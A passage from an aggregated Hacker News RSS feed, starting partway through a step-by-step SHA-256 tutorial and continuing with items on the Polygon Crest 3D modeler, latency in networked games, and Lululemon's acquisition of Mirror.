<p>Now we create 8 hash values. These are hard-coded constants that represent the first 32 bits of the fractional parts of the square roots of the first 8 primes: 2, 3, 5, 7, 11, 13, 17, 19</p>



<pre><code>h0 := 0x6a09e667
h1 := 0xbb67ae85
h2 := 0x3c6ef372
h3 := 0xa54ff53a
h4 := 0x510e527f
h5 := 0x9b05688c
h6 := 0x1f83d9ab
h7 := 0x5be0cd19</code></pre>



<h2><span id="Step_3_-_Initialize_Round_Constants_k">Step 3 ‚Äì Initialize Round Constants (k)</span>
</h2>



<p>Similar to step 2, we are creating some constants (<em>Learn more about constants and when to use them <a href="https://qvault.io/2019/10/14/constants-in-go-vs-javascript-and-when-to-use-them/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">here</a></em>). This time, there are 64 of them. Each value (0-63)  is the first 32 bits of the fractional parts of the cube roots of the first 64 primes (2 ‚Äì 311).</p>



<pre><code>0x428a2f98 0x71374491 0xb5c0fbcf 0xe9b5dba5 0x3956c25b 0x59f111f1 0x923f82a4 0xab1c5ed5
0xd807aa98 0x12835b01 0x243185be 0x550c7dc3 0x72be5d74 0x80deb1fe 0x9bdc06a7 0xc19bf174
0xe49b69c1 0xefbe4786 0x0fc19dc6 0x240ca1cc 0x2de92c6f 0x4a7484aa 0x5cb0a9dc 0x76f988da
0x983e5152 0xa831c66d 0xb00327c8 0xbf597fc7 0xc6e00bf3 0xd5a79147 0x06ca6351 0x14292967
0x27b70a85 0x2e1b2138 0x4d2c6dfc 0x53380d13 0x650a7354 0x766a0abb 0x81c2c92e 0x92722c85
0xa2bfe8a1 0xa81a664b 0xc24b8b70 0xc76c51a3 0xd192e819 0xd6990624 0xf40e3585 0x106aa070
0x19a4c116 0x1e376c08 0x2748774c 0x34b0bcb5 0x391c0cb3 0x4ed8aa4a 0x5b9cca4f 0x682e6ff3
0x748f82ee 0x78a5636f 0x84c87814 0x8cc70208 0x90befffa 0xa4506ceb 0xbef9a3f7 0xc67178f2</code></pre>



<h2><span id="Step_4_-_Chunk_Loop">Step 4 ‚Äì Chunk Loop</span>
</h2>



<p>The following steps will happen for each 512-bit ‚Äúchunk‚Äù of data from our input. In our case, because <em>‚Äúhello world‚Äù</em> is so short, we only have one chunk. At each iteration of the loop, we will be mutating the hash values h0-h7, which will be the final output.</p>



<h2><span id="Step_5_-_Create_Message_Schedule_w">Step 5 ‚Äì Create Message Schedule (w)</span>
</h2>



<ul><li>Copy the input data from step 1 into a new array where each entry is a 32-bit word:</li></ul>
<pre><code>01101000011001010110110001101100 01101111001000000111011101101111
01110010011011000110010010000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000001011000</code></pre>



<ul><li>Add 48 more words initialized to zero, such that we have an array <strong>w[0‚Ä¶63]</strong>
</li></ul>
<pre><code>01101000011001010110110001101100 01101111001000000111011101101111
01110010011011000110010010000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000001011000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
...
...
00000000000000000000000000000000 00000000000000000000000000000000</code></pre>



<ul>
<li>Modify the zero-ed indexes at the end of the array using the following algorithm:</li>
<li>For <strong>i</strong> from w[16‚Ä¶63]:<ul>
<li>s0 = (w[i-15] rightrotate 7) xor (w[i-15] rightrotate 18) xor (w[i-15] rightshift 3)</li>
<li>s1 = (w[i- 2] rightrotate 17) xor (w[i- 2] rightrotate 19) xor (w[i- 2] rightshift 10)</li>
<li>w[i] = w[i-16] + s0 + w[i-7] + s1</li>
</ul>
</li>
</ul>
<p>Let‚Äôs do w[16] so we can see how it works:</p>



<pre><code>w[1] rightrotate 7:
  01101111001000000111011101101111 -&gt; 11011110110111100100000011101110
w[1] rightrotate 18:
  01101111001000000111011101101111 -&gt; 00011101110110111101101111001000
w[1] rightshift 3:
  01101111001000000111011101101111 -&gt; 00001101111001000000111011101101

s0 = 11011110110111100100000011101110 XOR 00011101110110111101101111001000 XOR 00001101111001000000111011101101

s0 = 11001110111000011001010111001011

w[14] rightrotate 17:
  00000000000000000000000000000000 -&gt; 00000000000000000000000000000000
w[14] rightrotate19:
  00000000000000000000000000000000 -&gt; 00000000000000000000000000000000
w[14] rightshift 10:
  00000000000000000000000000000000 -&gt; 00000000000000000000000000000000

s1 = 00000000000000000000000000000000 XOR 00000000000000000000000000000000 XOR 00000000000000000000000000000000

s1 = 00000000000000000000000000000000

w[16] = w[0] + s0 + w[9] + s1

w[16] = 01101000011001010110110001101100 + 11001110111000011001010111001011 + 00000000000000000000000000000000 + 00000000000000000000000000000000

// addition is calculated modulo 2^32

w[16] = 00110111010001110000001000110111


</code></pre>



<p>This leaves us with 64 words in our message schedule (w):</p>



<pre><code>01101000011001010110110001101100 01101111001000000111011101101111
01110010011011000110010010000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000000000000
00000000000000000000000000000000 00000000000000000000000001011000
00110111010001110000001000110111 10000110110100001100000000110001
11010011101111010001000100001011 01111000001111110100011110000010
00101010100100000111110011101101 01001011001011110111110011001001
00110001111000011001010001011101 10001001001101100100100101100100
01111111011110100000011011011010 11000001011110011010100100111010
10111011111010001111011001010101 00001100000110101110001111100110
10110000111111100000110101111101 01011111011011100101010110010011
00000000100010011001101101010010 00000111111100011100101010010100
00111011010111111110010111010110 01101000011001010110001011100110
11001000010011100000101010011110 00000110101011111001101100100101
10010010111011110110010011010111 01100011111110010101111001011010
11100011000101100110011111010111 10000100001110111101111000010110
11101110111011001010100001011011 10100000010011111111001000100001
11111001000110001010110110111000 00010100101010001001001000011001
00010000100001000101001100011101 01100000100100111110000011001101
10000011000000110101111111101001 11010101101011100111100100111000
00111001001111110000010110101101 11111011010010110001101111101111
11101011011101011111111100101001 01101010001101101001010100110100
00100010111111001001110011011000 10101001011101000000110100101011
01100000110011110011100010000101 11000100101011001001100000111010
00010001010000101111110110101101 10110000101100000001110111011001
10011000111100001100001101101111 01110010000101111011100000011110 10100010110101000110011110011010 00000001000011111001100101111011
11111100000101110100111100001010 11000010110000101110101100010110</code></pre>



<h2><span id="Step_6_-_Compression">Step 6 ‚Äì Compression</span>
</h2>



<ul>
<li>Initialize variables <strong>a, b, c, d, e, f, g, h</strong> and set them equal to the current hash values respectively. <strong>h0, h1, h2, h3, h4, h5, h6, h7</strong>
</li>
<li>Run the compression loop. The compression ‚Ä¶</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/</a></em></p>]]>
            </description>
            <link>https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23839895</guid>
            <pubDate>Wed, 15 Jul 2020 00:38:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Polygon Crest ‚Äì open-source 3D polygonal editor]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 5 (<a href="https://news.ycombinator.com/item?id=23839480">thread link</a>) | @app4soft
<br/>
July 14, 2020 | http://ysflight.in.coocan.jp/polygoncrest/e.html | <a href="https://web.archive.org/web/*/http://ysflight.in.coocan.jp/polygoncrest/e.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div bordercolor="#111111" width="100%" id="AutoNumber1">
        <tbody><tr>
          <td>
          
          <h2>
            What's Polygon Crest?</h2>
          <p>
            This program is a polygon editor. Maybe more commonly called a 
			polygon modeler. You can call whichever comfortable for you. The 
			main purpose is to build aircraft and ground visual models for YS 
			FLIGHT SIMULATOR, but you can use it for making general polygonal 
			models. If you make a correct solid model, you can export the data 
			for 3D printing, for example. I wanted to make it easy to create 
			aircraft models, so this program can quickly make a popular 
			airfoils, and extrude along the wing leading and trailing edges. It 
			also has basic boolean operations and rounding functions as well.
            </p>
		  <p>
            <a href="http://ysflight.in.coocan.jp/polygoncrest/scrnshot/cessna172-english.png">
			<img height="170" src="http://ysflight.in.coocan.jp/polygoncrest/scrnshot/cessna172-english_small.png" width="320" xthumbnail-orig-image="scrnshot/cessna172-english.png"></a></p>
		  <h2>
            How to use?</h2>
		  <p>
            Usage can be found in the following URLs.</p>
		  <p>
            <a href="http://polycre.help.en.ysflight.com/">
			<strong>http://polycre.help.en.ysflight.com/</strong></a> (English)</p>
		  <p>
            <a href="http://polycre.help.jp.ysflight.com/">
			<strong>http://polycre.help.jp.ysflight.com/</strong></a> (Japanese)</p>
		  <h2>
            Donations are welcome</h2>
		  <p>
            Polygon Crest is a fre and open-source program.&nbsp; Therefore, you can 
			use it for free of charge.&nbsp; However, I appreciate if you donate some 
			money for supporting the development.&nbsp; For making donation, please 
			send some money via PayPal using the following button.
            </p>
		  
<!--webbot bot="HTMLMarkup" endspan i-checksum="11026" -->
		  <p>
            I will use the donated money for upgrading my developing 
			environment, buying books for learning new programming techniques, 
			maintaining and adding contents in YSFLIGHT.COM.&nbsp; Thank you for your 
			support!
            </p>
		  <h2>
            Download</h2>
		  <p>
            <strong>Version 20150329</strong></p>
		  <p>
            <strong>
			<a href="http://download.cnet.com/Polygon-Crest/3000-6677_4-76169623.html">[For MacOSX 
			&amp; Linux]</a> (Linux binary is also included in the Mac OSX 
			package.)</strong></p>
		  <p>
            <strong>
			<a href="http://download.cnet.com/Polygon-Crest-for-Windows/3000-6677_4-76170331.html">[For Windows]</a></strong></p>
		  <h2>
            Updates</h2>
          <p>
          <strong>2016/02/21</strong></p>
		  <ul>
			  <li>Digitally signed Mac OSX binary.&nbsp; You should be able to 
			  run the program without warning.&nbsp; If your setting only allows 
			  App Store applications, you will need to change the security 
			  setting to allow App Store &amp; digitally signed by known developers 
			  (or something like that.)</li>
			  <li>Linux binary is bundled in the Mac OSX package.&nbsp; You can 
			  run LinuxInstaller.py in the zip file, which will create an icon 
			  on the desktop.&nbsp; If it works well, I'm going to do the same 
			  for YSFLIGHT.</li>
			  <li>Now YSFLIGHT shares the same data structure of dynamic model 
			  (.DNM) with PolygonCrest.&nbsp; From the next version on, if you 
			  can open the .DNM file with PolygonCrest, it should (is supposed 
			  to) appear the same in YSFLIGHT.</li>
			  <li>Imprinting:&nbsp; You can imprinting a polygon or a constraint 
			  edge to a nearby polygons by selecting a polygon and then select 
			  Edit-&gt;Projection-&gt;Imprinting.</li>
			  <li>Sewing:&nbsp; You can select two vertices and select 
			  Edit-&gt;Local Operations-&gt;Sew between two vertices.&nbsp; Vertices 
			  will be created between the selected vertices and polygons along 
			  the path will be split.</li>
		  </ul>
		  <p>
          <strong>2015/05/23</strong></p>
		  <ul>
			  <li>Polygon Crest for Linux: You can really use the system 
			  clipboard.&nbsp; (Now it's closed inside Polygon Crest program)</li>
			  <li>Input/Output of Wavefront .OBJ format files.</li>
			  <li>Add "Recently Used Files"</li>
			  <li>Color Palette dialog.</li>
			  <li>Polygon Crest for Windows: Erased a false error message on 
			  start up.&nbsp; (It only appeared when I build in a release 
			  configuration, and I didn't notice :-P)</li>
		  </ul>
		  <p>
          <strong>2014/07/19</strong></p>
		  <p>
          First release!&nbsp; Version 20140716.&nbsp; I wanted to add more 
		  features.&nbsp; But, if I wait until I finish all the features that I 
		  want to add, it's going to take infinity.&nbsp; I decided to make it 
		  open now.&nbsp; I'll keep developing and newer versions will be 
		  available.</p>
          
          </td>
        </tr>
        </tbody></div></div>]]>
            </description>
            <link>http://ysflight.in.coocan.jp/polygoncrest/e.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23839480</guid>
            <pubDate>Tue, 14 Jul 2020 23:42:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Networked games: Playing in the past or future]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 30 (<a href="https://news.ycombinator.com/item?id=23839390">thread link</a>) | @zdw
<br/>
July 14, 2020 | https://www.evanjones.ca/network-game-simulation.html | <a href="https://web.archive.org/web/*/https://www.evanjones.ca/network-game-simulation.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<h3>[ 2020-July-14 10:46 ]</h3>
<p>A few years ago I was fascinated by how network games worked after reading a <a href="https://gafferongames.com/post/introduction_to_networked_physics/">series of articles about Networked Physics that includes some great demo movies</a>. I didn't really understand it. How can the game be playable, when the client and server are separated by approximately 100 ms of network delay? I decided to create a small demo of a networked game, to try and figure it out. However, like most projects I start, I abandoned it after spending a few hours on it. I rediscovered it a couple months ago, and got it to a reasonabl y "finished" state. <a href="https://www.evanjones.ca/network-game-simulation-demo.html">The demo shows the client and server state of a "game"   and lets you adjust the simulated latency</a>. This gave me a huge appreciation for clever tricks used to create fast-paced games that are playable over the Internet. In particular, I find it amazing that the clients are playing the game either in the past or the future, but it still works to create an interactive experience.</p>


<h2>Local latency</h2>
<p>One important lesson is that even a local game has latency. Let's ignore things like <a href="https://danluu.com/keyboard-latency/">keyboard latency</a> or <a href="https://pcmonitors.info/articles/factors-affecting-pc-monitor-responsiveness/">display latency</a>, each of which can easily add ~50 ms of delay. Let's just consider the game loop, which involves reading input, simulating the world, then drawing the world. This means after a button press arrives, the game will not respond until the next frame. Many displays can show a maximum of 60 frames per second (FPS), which translate to an average of 8 ms of delay (uniformly distributed between 0-16 ms). That initial frame also might just register "player is moving forward", but won't actually move the player forward until the next frame, so that means it can be up to 33 ms between when you pressed the button and see a change. Many games run slower than that, which scales up the delay. The conclusion is that even that "fast" reaction you get in a local game is not instantaneous, and may actually have approximately 100 ms delay between inputs and seeing an update.</p>

<h2>No prediction: playing in the past</h2>
<p>The simplest network game model, and the one that is implemented in my demo, is to have the client send commands to the server, and have the server send state back to the client, which displays them. With this implementation, when you press a button to take an action, like moving forward, it takes one entire network round trip before you see the movement. The initial versions of Doom and Quake used this approach, because they were designed for local networks and not the Internet. Quake was released just when home Internet was becoming widespread, and people did play over the Internet anyway, which only worked if the network round trip time was low. With my demo, this feels playable up to about 50 ms of one-way latency.</p>

<p>The most interesting part to me is this means players are playing the game in the past, when compared to the server state. I've drawn the diagram below in an attempt to describe what I mean. Both the client and server start the game at the same instant, <code>t=0</code>. At this time, the player presses the "move forward" button, so the client sends this message to the server. It takes one time unit/frame to get to the server, so at t=1, the server receives and processes the button press. At t=2 the server simulates the player moving forward one unit, and sends the state to the client. Finally, at t=3 the client receives the updated position displays it. This means the client's display was updated at t=3, instead of t=1 in the "local" version. This is delayed by one network round trip time (2 units in this example). At any instant, the client is one time unit behind the server, which is what I mean that the game is being played in the past.</p>

<p><img alt="no prediction diagram" height="361" src="https://www.evanjones.ca/network-game-simulation-past.svg" width="703"></p>

<p>When I experiment with moving and firing in my simulation, I think I can notice even a small amount of latency. However, I feel like I can adapt to it and the game is playable up to about 50 ms. Above that point, it starts to feel "impossibly" slow and really unpleasant. This means this simple simulation will only work for physically "close" players. From my home connection in New York City to Google Cloud's data centers as measured by <a href="http://gcpping.com/">gcpping.com</a>, I can only play games hosted on the eastern half of North America (Virgina, South Carolina, and Montreal).</p>

<h2>Prediction: playing in the future</h2>
<p>To hide the effects of latency, modern games predict the effect of their actions. As a result, clients are now in the future, rather than in the past. Let's reconsider our example, where a game starts and a player immediately starts moving forward, shown below. In the first instant, the client processes the move forward command, so it sends it to the server. In the next instant, the client predicts moving forward one step, and the server receives the message. In the second instant (t=2), the client has predicted moving forward another step. The server simulates the movement and sends the "official" state. In the next instant (t=3), the client receives the confirmation that the user did move forward. The tricky part is the client needs to decide if this agrees with its simulation. If it does not, then it needs to "rewind" its simulation, and replay its local actions again.</p>

<p><img alt="with prediction diagram" height="358" src="https://www.evanjones.ca/network-game-simulation-future.svg" width="700"></p>

<p>With client-side prediction, the time between an input and a display update is the as a local game. However, the client is ahead of the server's "real" state by one network delay, which is what I mean that it is playing in the future.</p>

<h2>Further reading</h2>
<p>I am not an expert on this subject, since I have never worked in games. If you want to learn more, you should read about how real games make this work.</p>

<ul>
<li><a href="https://github.com/evanj/netgamesim">netgamesim source code</a>: The code for my demo simulator.</li>
<li><a href="https://gafferongames.com/post/introduction_to_networked_physics/">Networked Physics</a>: The original series of articles that got me interested. See the <a href="https://gafferongames.com/categories/networked-physics/">series index</a> for more details.</li>
<li><a href="https://www.gabrielgambetta.com/client-server-game-architecture.html">Fast-Paced Multiplayer</a>: Another series describing how this works.</li>
<li><a href="https://fabiensanglard.net/quake3/network.php">Quake 3 Networking</a>: A description of how Quake 3 worked from reviewing the source code. It is instructive to compare this to how <a href="https://fabiensanglard.net/quakeSource/quakeSourceNetWork.php">the original QuakeWorld worked</a>, since it added client-side prediction to Quake.</li>
<li><a href="https://developer.valvesoftware.com/wiki/Latency_Compensating_Methods_in_Client/Server_In-game_Protocol_Design_and_Optimization">Latency Compensating Methods in Client/Server Games</a>: Notably this article describes how Half Life makes "instant hit" weapons work with client-side prediction, and how this is a game design choice since there are some fundamental necessary trade-offs.</li>
</ul>

</div></div>]]>
            </description>
            <link>https://www.evanjones.ca/network-game-simulation.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23839390</guid>
            <pubDate>Tue, 14 Jul 2020 23:30:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Breaking Down Lululemon's $500M Mirror Acquisition]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 26 (<a href="https://news.ycombinator.com/item?id=23838564">thread link</a>) | @Cpevans
<br/>
July 14, 2020 | https://insider.fitt.co/issue-no-87-why-mirror-sold/ | <a href="https://web.archive.org/web/*/https://insider.fitt.co/issue-no-87-why-mirror-sold/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-content">
			<div>
				<div>
					<section>
						<p>A few weeks back, lululemon acquired Mirror for $500M. When the news broke, we wrote&nbsp;<a href="https://insider.fitt.co/lululemon-acquires-mirror-500m/" target="_blank" rel="noopener">a quick analysis</a>&nbsp;of how the partnership might play out. Today, we‚Äôre going deeper to explore lulu‚Äôs ambitions, Mirror‚Äôs motivation for selling, and how, in hindsight, Nike, Peloton, and COVID-19 sealed the deal.</p>
<p><strong>TL;DR:</strong>&nbsp;Even if this acquisition doesn‚Äôt pan out, everybody wins. Here‚Äôs why.</p>
					</section>

          <section>
						      <div>
        <div>
                      <h2>Calculated Risk</h2>
          
          <p>M&amp;A is a mixed bag. In the case of activewear retailers, buying into digital fitness via high-profile purchases has&nbsp;<a href="https://twitter.com/JoeVennare/status/1281301589190488064" target="_blank" rel="noopener">proven futile</a>. So why did lululemon, a fast-growing apparel company, roll the dice on Mirror? One word: Nike.</p>
<p>Nike is the king of activewear. Try as they might, foes like adidas, Reebok, and Under Armour are no match for the swoosh. For its part, lululemon hopes to become a worthy adversary ‚Äî if for no other reason than to remain in the good graces of Wall Street. On both accounts, Mirror factors heavily into the equation.</p>
<p>Putting this competition into context, lululemon trails Nike by an order of magnitude. Nike has a $152B market cap. Over the last 12 months, they‚Äôve done $37B in sales. Meanwhile, lulu‚Äôs market cap is $37B, and the company had revenues of $3.85B over the same period.</p>
<p>While shares of the yoga pant maker have outperformed Nike in recent years, lulu might not ever reach the scale of Nike. But beating Nike outright isn‚Äôt the point. Ultimately, lululemon is in competition with itself, where Nike represents the upper bounds of what‚Äôs possible.</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>Just Keep Growing</h2>
          
          <p>To prove that they haven‚Äôt peaked, lululemon has one mandate: just keep growing.</p>
<p>Moving beyond the yoga niche and expanding its total addressable market, the company‚Äôs&nbsp;<a href="https://us15.campaign-archive.com/?u=4c6bc12e271bc681951ed945a&amp;id=96471d02c6" target="_blank" rel="noopener">five-year strategic plan</a>, released in April 2019, charted the path forward: ‚Äúdouble men‚Äôs, double digital, and quadruple international‚Äù revenues. Add self-care products, a foray into footwear, and the opening of a 20,000-square-foot experiential store (complete with yoga studios and a restaurant) into the mix and grow they shall.</p>
<p>A few months later, in November of 2019, lululemon invested $1M into Mirror‚Äôs $34M Series B-1, a bargain for a foothold in connected fitness. As part of the investment, and in keeping with its goal of becoming an experiential brand, lululemon ambassadors began creating workout content for the Mirror platform.</p>
<p>Flash-forward to March: when COVID hit, the table was set. With retail stores shuttered and fitness studios closed, shopping and sweating moved online. In a few short weeks, lululemon had seen enough; they were ready to go all-in on Mirror.</p>
<ul>
<li>In the first week of store closures, 170K people joined lulu‚Äôs live workouts on Instagram.</li>
<li>Pre-COVID, 64% of lululemon guests used a digital workout option at home.</li>
<li>During the pandemic, as the coronavirus spread, that number jumped to 75%.</li>
<li>86% of lulu customers who used an at-home option during the outbreak plan to continue or increase their new digital workout habit.</li>
</ul>
<p>In April, lulu‚Äôs online sales surged&nbsp;<a href="https://www.cnbc.com/2020/06/11/lululemon-lulu-reports-fiscal-q1-2020-earnings.html" target="_blank" rel="noopener">125%</a>, a trend that‚Äôs expected to continue. Add in the fact that some 50% of Mirror users are also lululemon customers, and this deal checks a lot of boxes for the growth-focused retailer.</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>Why Mirror Sold</h2>
          
          <p>Last year, Mirror CEO Brynn Putnam told Fast Company she was building ‚Äúthe next iPhone.‚Äù Far from another connected fitness upstart, Mirror would be ‚Äúthe third screen in your life that you‚Äôre going to turn to for all immersive interactive experiences going forward.‚Äù</p>
<p>About seven months later, Putnam pulled the ripcord, selling her company amid a global pandemic ‚Äî circumstances tailor-made for an immersive third screen.</p>
<p>So why did Mirror sell? lulu made an offer they couldn‚Äôt refuse. Putnam, a solo, female founder just secured a ‚ÄúW‚Äù for herself, her investors, and New York‚Äôs startup scene.</p>
<p>Beyond the obvious, it‚Äôs fair to ask,&nbsp;<em>why now?</em>&nbsp;In many ways, Peloton forced Putnam‚Äôs hand.</p>
<p>Pitching Mirror as the ‚Äúnext iPhone‚Äù was a strategic move that 1.) established a big vision worthy of $70M+ in funding, and 2.) helped the company duck the question, ‚Äúhow do you compete with Peloton?‚Äù Their answer was simple ‚Äî we don‚Äôt.</p>
<p>When COVID hit, Mirror was pigeonholed. They weren‚Äôt the third screen, they were in direct competition with Peloton. And despite surging sales, Mirror‚Äôs growth pales in comparison to Peloton‚Äôs. Plus, there‚Äôs&nbsp;<a href="https://www.linkedin.com/posts/joevennare_fitness-startups-activity-6679025786697117697-YuI5" target="_blank" rel="noopener">a growing list of Mirror-like competitors</a>&nbsp;hitting the market. All of a sudden, an interactive screen didn‚Äôt feel all that innovative, or defensible.</p>
<p>Meanwhile, digital fitness companies are raking in funding. Hydrow, Aaptiv, and NEOU recently closed investments as Tonal and Tempo target new funds. If Mirror considered raising on the back of its COVID boost, they‚Äôd have to become a customer acquisition and retention machine, where every move is audited in relation to Peloton‚Äôs now public (and soaring) metrics.</p>
<p>In the end, joining forces with lululemon was more compelling than slugging it out with Peloton or adhering to the ‚Äúthird screen‚Äù narrative.</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>Lulu x Mirror</h2>
          
          <p>Upon announcing the deal, lululemon‚Äôs stock jumped, and onlookers have been quick to heap on the praise.</p>
<p>According to Bank of America analysts, Mirror could generate&nbsp;<a href="https://www.marketwatch.com/amp/story/lululemon-acquisition-mirror-could-generate-700-million-and-reach-600000-subscribers-by-2023-bank-of-america-2020-07-01" target="_blank" rel="noopener">$700M</a>&nbsp;in revenue and reach 600,000 subscribers by 2023.</p>
<p>To realize this lofty forecast, lululemon will sell Mirrors to its existing customer base, starting with its 489 corporate-owned stores across the globe. The retailer will continue creating content for the platform, where Mirror instructors will be clad in lululemon gear. More than simply selling more apparel, Mirror‚Äôs ability to generate recurring revenue and strengthen lulu‚Äôs relationship with consumers is the chief aim of this acquisition.</p>
<p>While the hard work of transforming an athleisure retailer into a tech company is just beginning, it will be difficult to criticize lululemon for shooting this shot. Whether or not they can keep growing will be the question on everyone‚Äôs mind:</p>
<p><em>‚ÄúLulu is showing no signs of slowing down, but acquisitions made outside a retailer‚Äôs core skill set have rarely been seamless. There is nothing bad about the story right now. The scariest thing [for investors] about Lulu is, is this as good as it gets?‚Äù</em>&nbsp;‚Äì Simeon Siegel, managing director &amp; senior retail analyst at BMO Capital Markets.</p>
<hr>
        </div>
      </div>

            <div>
        <div>
                      <h2>üíª Closing the Gap </h2>
          
          <p>Teletherapy is gaining traction during the pandemic. It just might be the key to unlocking access for millions of individuals battling mental illness.</p>
<p>There‚Äôs a&nbsp;<a href="https://insider.fitt.co/wellness-startups-mental-health/" target="_blank" rel="noopener">shocking gap</a>&nbsp;between demand (those in need of care) and supply (access to affordable care).</p>
<ul>
<li>46M Americans report experiencing mental illness each year, while only 42.6% received treatment.</li>
<li>Individuals who are able to access care will wait an average of&nbsp;<a href="https://www.psychiatryadvisor.com/home/practice-management/long-wait-times-typical-for-psychiatry-appointments/" target="_blank" rel="noopener">25 days</a>&nbsp;for an appointment.</li>
<li>With in-room therapy costing $150‚Äì$400 per session, plus the added cost of medication,&nbsp;<a href="https://www.kff.org/medicaid/report/mental-health-financing-in-the-united-states/" target="_blank" rel="noopener">45%</a>&nbsp;of untreated individuals cite cost as a barrier.</li>
</ul>
<p><strong>Pros:</strong>&nbsp;During COVID, the majority of therapists switched from in-person to remote therapy. A recent&nbsp;<a href="https://www.apaservices.org/practice/legal/technology/psychologists-embrace-telehealth" target="_blank" rel="noopener">survey</a>&nbsp;found that three quarters of clinicians are exclusively using teletherapy. The fact that teletherapy has been&nbsp;<a href="https://pubmed.ncbi.nlm.nih.gov/26864655/" target="_blank" rel="noopener">shown to be</a>&nbsp;just as effective as in-person therapy for treating PTSD, depression, and anxiety helped solidify the switch.</p>
<p><strong>Cons:</strong>&nbsp;The convenience and flexibility of remote care have proven beneficial, but concerns related to privacy regulations, insurance coverage, Zoom fatigue, and missing non-verbal cues leave a lot of room for improving the experience.</p>
<p>As consumer demand for digital behavioral health grows, investors are seizing the moment.</p>
<ul>
<li>According to&nbsp;<em>Rock Health</em>, in the first half of 2020, digital behavioral health companies received&nbsp;<a href="https://rockhealth.com/reports/2020-midyear-digital-health-market-update-unprecedented-funding-in-an-unprecedented-time/" target="_blank" rel="noopener">$588M</a>&nbsp;in funding ‚Äî a number equal to the annual funding for this category in any previous year.</li>
</ul>
<p><strong>Looking ahead:</strong>&nbsp;With anxiety and isolation at an&nbsp;<a href="https://insider.fitt.co/insider-newsletter-issue-82-ending-addiction/" target="_blank" rel="noopener">all-time high</a>, the need to confront the&nbsp;<a href="https://insider.fitt.co/wellness-startups-mental-health/" target="_blank" rel="noopener">mental health crisis</a>&nbsp;has never been greater. A bright spot amid the pandemic, digital behavioral health is&nbsp;<a href="https://insider.fitt.co/wellness-startups-stigma/" target="_blank" rel="noopener">destigmatizing</a>&nbsp;and expanding access to care.</p>
<p><strong>Related:</strong>&nbsp;<a href="https://insider.fitt.co/23-alex-katz-ceo-of-two-chairs/" target="_blank" rel="noopener">Two Chairs CEO Alex Katz</a>&nbsp;on the Fitt Insider podcast</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>ü•ä Put ‚Äôem Up</h2>
          
          <p>Liteboxer, the latest&nbsp;<a href="https://us15.campaign-archive.com/?u=4c6bc12e271bc681951ed945a&amp;id=f14e6a628d" target="_blank" rel="noopener">Peloton of ‚ÄòX‚Äô</a>&nbsp;upstart, is taking aim at boxing within the booming connected fitness category.</p>
<p><strong>What it is:</strong>&nbsp;A competitor to FightCamp, an interactive at-home boxing experience, Liteboxer offers a free-standing, light-up punching bag for $1,495 and a $29/month content subscription.</p>
<p><strong>How it works:</strong>&nbsp;While FightCamp offers punch tracking technology and a variety of workouts from ‚Äúreal fighters‚Äù, Liteboxer looks a lot like Dance Dance Revolution for boxing. Flashing lights synced to music tell users where to hit and a force-tracking bag measures performance.</p>
<p><strong>Looking ahead:</strong>&nbsp;Following in Peloton‚Äôs footsteps is tempting, but surely at-home fitness has a ceiling ‚Äî especially when every piece of equipment costs $1,500 or more.</p>
<p>For their part, Peloton appears to be rethinking the category a bit. The company was rumored to be working on a connected rower √† la Hydrow. But recently, CFO Jill Woodworth&nbsp;<a href="https://outline.com/9fv3sB" target="_blank" rel="noopener">said</a>&nbsp;the company will forgo the rower, for now, in favor of a cheaper treadmill. Woodworth also said developing a product for the ‚Äúboot camp category‚Äù is a priority. Is Peloton‚Äôs Mirror competitor in the works?</p>
<p><strong>Related:</strong>&nbsp;<a href="https://insider.fitt.co/7-khalil-zahar-co-founder-ceo-of-fightcamp/" target="_blank" rel="noopener">FightCamp CEO Khalil Zahar</a>&nbsp;on the Fitt Insider podcast</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>üì∞ News &amp; Notes</h2>
          
          <ul>
<li>The designification of&nbsp;<a href="https://www.metropolismag.com/interiors/healthcare-interiors/the-problem-with-the-designification-of-health-care/" target="_blank" rel="noopener">health</a>.</li>
<li>A&nbsp;<a href="https://twitter.com/joevennare/status/1278739336268308480?s=12" target="_blank" rel="noopener">thread</a>: Apple as a healthcare company</li>
